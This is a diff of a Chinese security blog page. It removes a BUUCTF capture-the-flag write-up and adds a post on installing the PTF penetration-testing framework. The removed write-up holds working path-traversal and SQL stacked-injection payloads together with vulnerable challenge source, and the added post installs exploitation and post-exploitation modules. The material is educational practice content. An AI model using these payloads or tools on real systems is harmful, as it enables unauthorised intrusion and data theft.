@@ -7,7 +7,7 @@
 
     
 
-    <title>BUUCTF Write Up | 2h0nG&#39;s Blog</title>
+    <title>2h0nG&#39;s Blog</title>
     <meta name="author" content="John Doe">
     
     <meta name="description" content="Love is friendship fell into love">
@@ -15,7 +15,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="BUUCTF Write Up"/>
+    
     <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
 
     
@@ -196,7 +196,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/Web渗透测试/">
-                    Web渗透测试 <span class="right">24 篇</span></a>
+                    Web渗透测试 <span class="right">26 篇</span></a>
                 </a>
             </li>
 
@@ -270,10 +270,6 @@
         <span class="breadcrumb">当前位置（分类目录）</span>
         
             
-    
-    
-    <a class="breadcrumb" href="/categories/CTF笔记/">CTF笔记</a>
-
 
         
 
@@ -289,12 +285,12 @@
             <div class="article-title">
                 
     
-        <h1>BUUCTF Write Up</h1>
+        <h1>无题</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-10-13T02:08:22.000Z"><a href="/2020/10/13/CTF%E7%AC%94%E8%AE%B0/BUUCTF%20Write%20Up/">2020-10-13</a></time>
+            <time class="pink-link-context" datetime="2020-10-29T13:48:03.198Z"><a href="/2020/10/29/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Ubuntu%E6%90%AD%E5%BB%BAPTF%E6%A1%86%E6%9E%B6/">2020-10-29</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -302,61 +298,27 @@
 </span>
 
             
-    <div class="tags-row">
-        
-            <a href="/tags/CTF笔记/" class="chip pink lighten-1">CTF笔记</a>
-        
-    </div>
-
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#BUUCTF-Write-Up"><span class="section table-of-contents-text">BUUCTF Write Up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81-HCTF-2018-Warm-Up"><span class="section table-of-contents-text">一、[HCTF 2018]Warm Up</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81-SUCTF-2019-EasySQL1"><span class="section table-of-contents-text">二、[SUCTF 2019]EasySQL1</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A"><span class="section table-of-contents-text">解法1：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="section table-of-contents-text">解法2：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="section table-of-contents-text">总结：</span></a></li></ol></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#title%EF%BC%9AUbuntu20-04%E6%90%AD%E5%BB%BAPTF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6"><span class="section table-of-contents-text">title：Ubuntu20.04搭建PTF渗透测试框架</span></a></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                <h2 id="BUUCTF-Write-Up"><a href="#BUUCTF-Write-Up" class="headerlink" title="BUUCTF Write Up"></a>BUUCTF Write Up</h2><h3 id="一、-HCTF-2018-Warm-Up"><a href="#一、-HCTF-2018-Warm-Up" class="headerlink" title="一、[HCTF 2018]Warm Up"></a>一、[HCTF 2018]Warm Up</h3><p>开局一滑稽，源码找玄机。source.php，关键在这里。</p>
-<p>​    审计源码，目的是绕过以下主函数代码，需要传入一个参数file，并且通过字符串检查和一个emmm类中的checkFile方法的检查，最终执行一个include函数，这里明显是通过检查并且通过include读取flag文件。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
-
-<p>​    审计checkfile方法，发现有一个白名单数组，里面有一个hint.php，打开一看，原来是提示了flag的文件名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>mb_substr(arg1,arg2,arg3)：从arg1中截取arg2-arg3的字符串；mb_strpos(arg1,arg2)：从arg1中找到arg2第一次出现的位置。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];    #白名单</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;    #是否传入参数，是否参数为字符串</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;    #判断参数是否在白名单，如果不在继续判断</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(    #截取第一个?前的值，如果没?，则是整个字符串，因为函数中自己加了一个?</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    </span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;    #再次判断是否在白名单，如果不在继续判断，这里在?前加一个白名单的值其实就可以构造payload了。</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);    #这里进行一次url解码</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    #然后截取第一个?前的值判断是否在白名单</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>urldecode解码前的判断就已经可以构造payload了，通过对payload的构造可以实现目录任意穿越读取。不停的尝试，最终读取到flag</p>
-<p>Payload：<code>http://4526f00b-4a4c-435b-9112-69769b94c105.node3.buuoj.cn/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
-<h3 id="二、-SUCTF-2019-EasySQL1"><a href="#二、-SUCTF-2019-EasySQL1" class="headerlink" title="二、[SUCTF 2019]EasySQL1"></a>二、[SUCTF 2019]EasySQL1</h3><p>nmd，这题头得多铁能猜到后台源码是：<code>select $_POST[&#39;query&#39;]||flag from Flag</code>，这就是大佬的世界？完全没逻辑的猜测。听说CTF现场有源码泄露，但是BUUCTF上没有进行复现，具体怎么泄露的源码也没有找到WriteUp，Ok。</p>
-<p>另外，此题采用<code>mysqli_multi_query()</code>运行SQL语句，所以是可堆叠注入。</p>
-<p>泄露的源码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&#39;query&#39;]))&#123;</span><br><span class="line">        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));</span><br><span class="line">        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;</span><br><span class="line">            &#x2F;&#x2F;echo $post[&#39;query&#39;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&#39;query&#39;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p><strong>Payload</strong>：<code>*,1</code>  ===&gt;    <code>select *,1||flag from Flag;</code>， </p>
-<p><code>1||flag</code>作为一个结果为boolean类型的值相当于1。（如果是*,0 则0||flag为0false），因此执行核心查询语句<code>select * from Flag</code></p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZZNt"><img src="https://s1.ax1x.com/2020/10/13/0fZZNt.png" alt="0fZZNt.png"></a></p>
-<h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p>把这个<code>||</code>或字符咱们给它运用上，这里涉及到Mysql的<code>sql_mode</code>的设置，通过变量的方式去配置它。</p>
-<blockquote>
-<p>sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符 </p>
+                <hr>
+<h2 id="title：Ubuntu20-04搭建PTF渗透测试框架"><a href="#title：Ubuntu20-04搭建PTF渗透测试框架" class="headerlink" title="title：Ubuntu20.04搭建PTF渗透测试框架"></a>title：Ubuntu20.04搭建PTF渗透测试框架</h2><blockquote>
+<p>PTF框架项目：<a target="_blank" rel="noopener" href="https://github.com/trustedsec/ptf">https://github.com/trustedsec/ptf</a>    </p>
 </blockquote>
-<p>因此当<code>set sql_mode=PIPES_AS_CONCAT</code>时，这个<code>||</code>就相当于字符串连接函数concat(‘’,’’)辣。</p>
-<p><strong>payload:</strong><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
-<p>相当于：<code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code>，这里<code>1||flag</code> ==&gt; <code>concat(1,&#39;flag&#39;)</code></p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZjKg"><img src="https://s1.ax1x.com/2020/10/13/0fZjKg.png" alt="0fZjKg.png"></a></p>
-<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h4><p>希望从这里学习到一些新思路，在遇到堆叠注入有特殊的字符时，可以思考sql_mode这个设置，能否将特殊字符变得合理可利用化。</p>
+<p>​    搭建服务器的一个快速方法是集成 TrustedSec 公司的渗透测试框架 (PTF)。PTF 框架是一些脚本的合集，可以为你做大量的艰苦工作并为其他所有内容创建了一个框架。让我们通过一个快速示例来安装我们所有的漏洞利用模块，信息收集模块，后渗透利用模块，PowerShell 攻击模块和漏洞分析工具：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo su -</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/trustedsec/ptf /opt/ptf</span><br><span class="line"><span class="built_in">cd</span> /opt/ptf</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">./ptf</span><br><span class="line">use modules/exploitation/install_update_all</span><br><span class="line">use modules/intelligence-gshathering/install_update_all</span><br><span class="line">use modules/post-exploitation/install_update_all</span><br><span class="line">use modules/powershell/install_update_all</span><br><span class="line">use modules/vulnerability-analysis/install_update_all</span><br><span class="line"><span class="built_in">cd</span> /pentest</span><br></pre></td></tr></table></figure>
+
 
                 
-<p class="pink-link-context">
-    <a href="/2020/10/21/CTF%E7%AC%94%E8%AE%B0/SQLi-lab/" rel="next" title="SQLi-labs">
-    上一篇：SQLi-labs
-  </a>
-</p>
-
 
 
 <p class="pink-link-context">
-    <a href="/2020/10/13/%E9%98%B6%E6%AE%B5%E4%BA%94%E3%80%81Python/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3%E7%9A%84python%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="next" title="零零散散的python知识点">
-    下一篇：零零散散的python知识点
+    <a href="/2020/10/29/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Ubuntu%E6%90%AD%E5%BB%BAPTF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/" rel="next" title="">
+    下一篇：
   </a>
 </p>
 
